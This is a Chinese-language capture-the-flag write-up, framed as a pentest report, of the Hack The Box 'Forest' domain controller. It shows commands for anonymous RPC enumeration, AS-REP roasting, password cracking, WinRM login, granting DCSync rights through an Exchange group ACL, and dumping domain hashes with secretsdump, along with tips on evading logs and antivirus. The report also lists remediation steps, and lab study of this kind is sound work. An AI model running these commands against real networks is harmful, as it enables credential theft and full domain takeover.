## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Forest
2. 難度:Easy
3. IP:10.129.95.210

### 主要發現：
1. 漏洞 ：透過RPC協議匿名訪問獲得內部使用者資訊（風險等級：High）
2. 漏洞 ：透過AD權限配置錯誤與不安全帳號策略導致管理員憑證外洩（風險等級：Critical）

### 攻擊鏈摘要：

透過違反最小原則的RPC協議匿名枚舉出網域內的使用者帳號，其中包含未開啟Kerberos預先驗證的使用者，可針對該使用者離線破解獲得有效的使用者憑證，並成功入侵內網。外洩的使用者所屬群組對Exchange Windows Permissions群組有GenericALL權限，並且Exchange Windows Permissions對DC有WriteDacl權限，攻擊者透過修改DACL賦予自身DS-Replication-Get-Changes-All權限，隨後執行DCSync攻擊，提取Administrator雜湊，完全接管網域。


### 潛在影響：

1. 允許匿名登入的RPC協議違反最小原則，導致內網資料外洩。
2. 使用者未開啟Kerberos預先驗證將導致憑證外洩、內網被侵入及內部資料外洩。
3. 群組權限配置錯誤導致管理員憑證外洩、網域被全面接管。
4. 藉由控制DC，攻擊者可持久化控制。


### 修復建議：

1. 限制RPC協議的匿名列舉功能，修改登錄檔RestrictAnonymous設定。
2. 對所有帳號強制啟用需要Kerberos預先驗證。
3. 定期要求更換強密碼，以抵抗離線破解攻擊。
4. 重新審核Exchange Windows Permissions群組的高權限。
5. 清理巢狀群組結構，移除不必要的GenericALL權限分配。
6. 監控網域控制器上的複寫請求動作（如DS-Replication-Get-Changes-All），以及異常的WriteDacl變更行為。


---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠，除了AD環境以外並未有其他特殊服務

```bash
sudo nmap -sT -Pn --min-rate 1000 -p- 10.129.95.210 -oA portscan/ports
sudo nmap -sU --top-ports 20 10.129.95.210 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p$ports 10.129.95.210 -oA portscan/detail
sudo nmap --script=vuln -p$ports 10.129.95.210 -oA portscan/vuln
```

<img width="806" height="679" alt="螢幕擷取畫面 2026-04-05 202222" src="https://github.com/user-attachments/assets/3e17f169-81be-4c8a-ad43-4ab095f42493" />

<img width="597" height="583" alt="螢幕擷取畫面 2026-04-05 202234" src="https://github.com/user-attachments/assets/d3bd76f8-6ed0-4dc4-9f88-2b9bf6bf13e9" />

<img width="1658" height="760" alt="螢幕擷取畫面 2026-04-05 202635" src="https://github.com/user-attachments/assets/9deebc5e-0bdc-4eda-8b29-c004ac8bfa7d" />

<img width="919" height="471" alt="螢幕擷取畫面 2026-04-05 202658" src="https://github.com/user-attachments/assets/5963f4ca-0e53-433d-bf5d-528e62848db7" />

<img width="1598" height="754" alt="螢幕擷取畫面 2026-04-05 202747" src="https://github.com/user-attachments/assets/c57cff90-53c1-469d-a2be-6399a4e22768" />

同樣，我也使用文書處理工具整理開放埠，以維持效率和美觀

```bash
ports=$(grep open portscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',' )
```

<img width="1049" height="139" alt="螢幕擷取畫面 2026-04-05 202251" src="https://github.com/user-attachments/assets/ac2f4c7a-b769-47cf-87c4-2df33728b5b9" />

根據Nmap -sC掃描結果有時間差問題，優先做時間同步，我使用ntpdate，這是基於UDP123的NTP協議，相對比較不會留下日誌或被管理員發現，關於時間同步已有小tips

```bash
sudo ntpdate 10.129.95.210
```

<img width="841" height="121" alt="螢幕擷取畫面 2026-04-05 202811" src="https://github.com/user-attachments/assets/e326f265-9e5b-4e65-afde-a2cc043cc27a" />

將掃描結果的兩個網域名寫入/etc/hosts

<img width="485" height="232" alt="螢幕擷取畫面 2026-04-05 203448" src="https://github.com/user-attachments/assets/6ce8b8c0-4422-475e-887d-3f10d7214fac" />


### 2.2 枚舉(Enumeration)

因尚未取得任何使用者憑證，我嘗試以匿名以及Guest嘗試登入SMB協議，我使用smbclient工具，這款工具相對比較像正常使用者流量，比較不會觸發異常警告
```bash
smbclient -L //10.129.95.210 -N
smbclient -L //10.129.95.210 -U "Guest"
```

<img width="809" height="285" alt="螢幕擷取畫面 2026-04-05 203703" src="https://github.com/user-attachments/assets/a8ea2a89-e1c6-4675-a332-2a9b30019795" />

SMB協議並未被允許，嘗試枚舉RPC協議，使用rpcclient，這款工具同樣比較像正常流量，但與impacket裡的工具相比所需權限較高，所rpcclient不被允許，可以換成impacket嘗試

```bash
rpcclient -U "" -N 10.129.95.210
```

我可以枚舉出使用者帳號及群組

<img width="410" height="660" alt="螢幕擷取畫面 2026-04-05 204009" src="https://github.com/user-attachments/assets/4a984f71-500e-43eb-8707-14efbba911c8" />

<img width="541" height="743" alt="螢幕擷取畫面 2026-04-05 204210" src="https://github.com/user-attachments/assets/c4b0ca45-e764-4f90-9b77-159550018957" />

雖說枚舉深度還有點淺，但有使用者帳號就足夠嘗試烤票了，我決定先烤票，如果失敗再回頭枚舉

### 2.3 初始存取(Initial Access)

將枚舉出的使用者帳號儲存成文件，可以用grep+awk+tee去處理，相對來說比較有效率且美觀，這裡就不展示了

<img width="278" height="185" alt="螢幕擷取畫面 2026-04-05 205115" src="https://github.com/user-attachments/assets/941a7dc5-9850-4883-abe9-18316fb4af0b" />

嘗試AS-REP Roasting，使用impacket-GetNPUsers工具，這是專門執行AS-REP Roasting的工具，若加上-request可掃描符合此攻擊前提的使用者帳號

切記，在做Kerberos相關攻擊前必須做時間同步，這裡不展示

AS-REP Roasting：當使用者帳號被設置「不需要Kerberos預身分驗證(Do not require Kerberos Pre-Authentication)」時，攻擊者可偽造請求，DC不會驗證身分，直接返回AS-REP數據包，數據包裡含使用者的密碼哈希，可背離線破解

```bash
impacket-GetNPUsers htb.local/ -userfile users -format hashcat -no-pass -dc-ip 10.129.95.210 -outputfile asrep_hash
```

<img width="1107" height="257" alt="螢幕擷取畫面 2026-04-05 205609" src="https://github.com/user-attachments/assets/ec701be6-3b6c-4039-89f1-ba042a47e312" />

將獲得的密碼哈希交給hashcat破解，hashcat相對來說比john快，因為是跑在GPU裡

若不熟悉哈希類型，可以用-hh配合grep搜尋

<img width="905" height="128" alt="螢幕擷取畫面 2026-04-05 210831" src="https://github.com/user-attachments/assets/d2c2cc98-1148-4a68-9083-6ab8502e849e" />

<img width="1502" height="340" alt="螢幕擷取畫面 2026-04-05 210937" src="https://github.com/user-attachments/assets/9f13dd85-ff6a-466f-a5c6-2eb9dbccfb50" />

<img width="1910" height="518" alt="螢幕擷取畫面 2026-04-05 210950" src="https://github.com/user-attachments/assets/8c86e10c-0eaa-4b30-8358-f48af342b491" />

我會習慣存成文件

<img width="336" height="151" alt="螢幕擷取畫面 2026-04-05 211107" src="https://github.com/user-attachments/assets/9d0d3ebb-f341-4b32-bbcd-2c340ab17268" />

使用evil-winrm嘗試登入，這是隱蔽性和完整性相對較好的工具，如果獲得憑證應優先嘗試(僅次於SSH)，前提是TCP5985/5986要有開

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3vice
```

<img width="1343" height="290" alt="螢幕擷取畫面 2026-04-05 211255" src="https://github.com/user-attachments/assets/5b7beadc-67f6-4a2c-9051-1d82d670074d" />


獲得user.txt

<img width="664" height="323" alt="螢幕擷取畫面 2026-04-05 211402" src="https://github.com/user-attachments/assets/3a667d26-afb8-4b29-9917-a39bf57d119e" />


### 2.4 權限提升(Privilege Escalation)

這個靶機的內部枚舉並不難，幾乎可以說是沒有叉路，可以嘗試不使用bloodhound練習，我原則上是不使用bloodhound的，只會在打完後驗證想法，以及遇到很難的靶機或是卡死沒想法，以下演示手動枚舉

將PowerView.ps1存在目錄裡

<img width="305" height="199" alt="螢幕擷取畫面 2026-04-05 213213" src="https://github.com/user-attachments/assets/32a7c47c-8f7f-474a-ad4e-9507dc403368" />

重新連上evil-winrm，同時使用-s參數導入腳本，如此腳本可透過winrm管道在記憶體中運行，不會被防毒掃到，當然實戰中會有AMSI，還要另外繞過，靶機環境中可以不做混淆
```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3vice -s ./scipt
```

<img width="1299" height="218" alt="螢幕擷取畫面 2026-04-05 213856" src="https://github.com/user-attachments/assets/691e01cd-7db3-4045-a238-047bdf495e72" />

用PowerView.ps1命令呼叫腳本

<img width="698" height="123" alt="螢幕擷取畫面 2026-04-05 214241" src="https://github.com/user-attachments/assets/f305df97-eae1-4028-8c92-e94f464fbd73" />

先了解現有使用者

```powerview
Get-DomainUser -Identity svc-alfresco
```

<img width="1101" height="723" alt="螢幕擷取畫面 2026-04-06 132016" src="https://github.com/user-attachments/assets/79a2b42e-c262-4361-8498-b15f64a9721f" />

我發現使用者屬於一個名字看起來很厲害的群組，我查詢使用者的所屬群組

```powerview
Get-DomainGroup -MemberIdentity SID
```

<img width="1088" height="686" alt="螢幕擷取畫面 2026-04-06 132953" src="https://github.com/user-attachments/assets/36f632ca-5d06-44f5-bf49-f6be8e25d24e" />

針對這個巢狀群組最上層枚舉
```powerview
Get-DomainGroup -Identity "Account Operators"
```

<img width="1050" height="483" alt="螢幕擷取畫面 2026-04-06 133054" src="https://github.com/user-attachments/assets/98260094-1487-44c4-b344-358b37baf043" />

這個群組權限肯定很多，我需要做好篩選，否則會一次性噴太多東西出來，沒辦法判斷，我先查詢這個群組(以下簡稱Acc)對哪些群組有GenericALL權限

```powerview
Get-DomainGroup | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.SecurityIdentifier -eq "S-1-5-32-548" -and $_.ActiveDirectoryRight -match "GenericALL" } | Select-Object -Expand ObjectDN -Unique
```

1. Get-DomainGroup：列出當前網域中的所有群組對象
2. Get-DomainObjectAcl：針對這些群組對象，讀取其ACL
3. -ResolveGUIDs：將ACL中難懂的GUID編碼轉換為人類可讀的權限名稱
4. ? 是Where-Object的縮寫
5. SecurityIdentifier：篩選出SID為Acc組的項目
6. ActiveDirectoryRight：檢查權限
7. Select-Object -Expand ObjectDN -Unique：輸出受影響對象的識別名稱(DN)，並去除重複項，轉成字串

<img width="1912" height="518" alt="螢幕擷取畫面 2026-04-06 152523" src="https://github.com/user-attachments/assets/f4e74c2d-5e8a-42d2-a446-87a62fb2cfb4" />

結果還是很多，我繼續篩選，使用-notmatch篩選掉CN有Builtin和Users的項，排除Users有可能讓回應變空，到時候再去掉就行

```powerview
Get-DomainGroup | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.SecurityIdentifier -eq "S-1-5-32-548" -and $_.ActiveDirectoryRight -match "GenericALL" -and $_.ObjectDN -notmatch "CN=Builtin|Users" } | Select-Object -Expand ObjectDN -Unique
```

<img width="1909" height="465" alt="螢幕擷取畫面 2026-04-06 153824" src="https://github.com/user-attachments/assets/2e6ef6bf-aa20-46db-82a7-0eebb44b82d6" />

剩下的項目裡全部都屬於同一個OU，我打算把他們打包成變數並轉換成SID，讓其與網域的ACL對照，找出有高權限的組，這個組就可以成為攻擊目標

```powerview
$targets = Get-DomainGroup | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.SecurityIdentifier -eq "S-1-5-32-548" -and $_.ActiveDirectoryRight -match "GenericALL" -and $_.ObjectDN -notmatch "CN=Builtin|Users" } | Select-Object -Expand ObjectDN -Unique
/
$targetSIDs = $targets | % { (Get-DomainObject $_).ObjectSID } | ? { $_ }
```
1. % 是ForEach-Object的縮寫，代表對列表中的每一個目標執行括號內的動作
2. (Get-DomainObject $_) ：去查詢目前處理的這個目標
3. .ObjectSID：直接從查詢結果中提取ObjectSID屬性
4. ? { $_ }：篩選出非空的結果

<img width="1903" height="63" alt="螢幕擷取畫面 2026-04-06 155725" src="https://github.com/user-attachments/assets/0a9946e5-f5d0-4617-85c8-92a01496b958" />

<img width="1290" height="93" alt="螢幕擷取畫面 2026-04-06 170541" src="https://github.com/user-attachments/assets/1e2571d5-d4c2-443c-beb6-bfa4e98d3fab" />

開始對照

```powerview
Get-DomainObjectAcl -Identity "DC=htb,DC=local" -ResolveGUIDs | ? { $_.SecurityIdentifier -in $targetSIDs -and $_.ActiveDirectoryRight -match "WriteDacl|GenericALL" }
```

<img width="1918" height="610" alt="螢幕擷取畫面 2026-04-06 170830" src="https://github.com/user-attachments/assets/faeeea5d-bfed-4db5-bbec-296f01804bc1" />

其中有幾項有權限，但無法作用在全域的，例如

1. ObjectAceType : ms-Exch-Dynamic-Distribution-List：代表權限只對這種物件類型有效
2. AceFlags : ContainerInherit, InheritOnly：這條ACE不作用在當前物件

<img width="737" height="370" alt="螢幕擷取畫面 2026-04-06 172305" src="https://github.com/user-attachments/assets/b154d487-20b8-411e-9178-c56d4ed7b067" />
<img width="723" height="372" alt="螢幕擷取畫面 2026-04-06 172353" src="https://github.com/user-attachments/assets/1a2e9a14-4454-4c37-9e45-a073ad88b63d" />

其中只有一個項目符合要求，我針對他的SID查詢
```powerview
Get-DomainObject -Identity "SID"
```

<img width="1909" height="764" alt="螢幕擷取畫面 2026-04-06 172555" src="https://github.com/user-attachments/assets/9a26c230-4e6f-4676-a8fe-3d8502194547" />

這就構建出了一條攻擊路徑：當前使用者屬於一巢狀群組，父組對Exchange Windows Permissions群組有GenericALL權限，Exchange Windows Permissions群組對htb.local有WriteDacl權限

如此可使用DCSync攻擊，攻擊者如果擁有特定權限，可以偽裝成一台DC，向真實的DC發送一個GetNCChanges請求(目錄複製服務遠端協定MS-DRSR)。DC會誤以為這是合法的同步請求，直接將包含使用者NTLM Hash的資料發送給攻擊者

可以將目前的使用者加入Exchange Windows Permissions群組，該組對網域根路徑有WriteDacl權限，所以可以給自己賦權(DS-Replication-Get-Changes和DS-Replication-Get-Changes-All)，再執行執行DCSync

```powerview
net group "Exchange Windows Permissions" svc-alfresco /add /domain //加組
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity "svc-alfresco" -Right All //賦權
```

<img width="1348" height="82" alt="螢幕擷取畫面 2026-04-06 003419" src="https://github.com/user-attachments/assets/c6054d85-d556-4968-a9ea-cb16755be218" />

使用impacket-secretdump擷取哈希，這個工具會產生大量的SMB流量，隱蔽性來說不如BloodyAD，我的首選是BloodyAD，這次是練習用impacket包

攻擊前做時間同步已經養成習慣，這裡不另外演示

```bash
impacket-secretdump htb.local/svc-alfresco:s3vice@10.129.95.210
```

<img width="972" height="636" alt="螢幕擷取畫面 2026-04-06 003442" src="https://github.com/user-attachments/assets/2a698ff4-17c2-47b1-ad07-c355167f367c" />

使用獲取到的哈希登入


<img width="1206" height="263" alt="螢幕擷取畫面 2026-04-06 003738" src="https://github.com/user-attachments/assets/28561827-3cd9-425e-b581-fa303d3303b4" />



### 2.5 最終成果(Impact)

獲得root.txt


<img width="678" height="530" alt="螢幕擷取畫面 2026-04-06 003941" src="https://github.com/user-attachments/assets/e614d205-c2c2-4b7f-b3d0-3dc2a6db281e" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 攻擊鏈一直線，沒有什麼彎彎繞繞
2. 手動枚舉也是一直線，不需要橫向移動


### 浪費時間的部分：

1. 網速太慢導致PowerView命令每次都要花一段時間才能讀取到，這是硬體問題，看如何改善

### 新知識點：

1. 手動枚舉時有碰到一些字串和物件的問題，要多注意
2. 枚舉思路很清晰

### 與實戰對應：

1. 腳本不落地是重要的
2. 大量的全域掃描其實很顯眼，可見紅隊攻防有多舉步維艱
